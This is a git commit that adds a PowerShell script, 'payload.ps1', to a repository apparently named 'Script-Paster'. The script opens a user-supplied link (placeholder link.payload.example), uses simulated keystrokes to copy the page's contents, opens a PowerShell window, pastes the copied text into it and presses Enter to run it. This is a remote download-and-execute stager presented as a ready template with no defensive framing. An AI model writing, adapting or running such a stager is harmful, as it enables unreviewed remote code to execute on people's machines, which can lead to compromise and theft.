678b1fc930885a8d8991a9dadbbf651f5f9d686a
Mr. Proxy <80650301+Mr-Proxy-source@users.noreply.github.com>
2023-08-28 23:33:37 +0200

    Create payload.ps1

---
+++ Script-Paster/payload.ps1
@@ -0,0 +1,24 @@
+.DESCRIPTION 
+	This program is designed to open payload from the link.
+
+# Enter your link to the script ↓
+
+# $link = "https://link.payload.example"
+
+Add-Type -AssemblyName System.Windows.Forms
+$o=New-Object -ComObject WScript.Shell
+$url = -join($link)
+Start-Process "$url" 
+Start-Sleep -Seconds 5
+[System.Windows.Forms.SendKeys]::SendWait('{TAB}'*2)
+[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
+Start-Sleep -Seconds 3
+[System.Windows.Forms.SendKeys]::SendWait("^{a}")
+[System.Windows.Forms.SendKeys]::SendWait("^{c}") 
+Start-Sleep -Seconds 1
+[System.Windows.Forms.SendKeys]::SendWait('%{F4}')
+Start-Process "powershell" 
+Start-Sleep -Seconds 2
+[System.Windows.Forms.SendKeys]::SendWait("^{v}") 
+Start-Sleep -Seconds 5
+[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
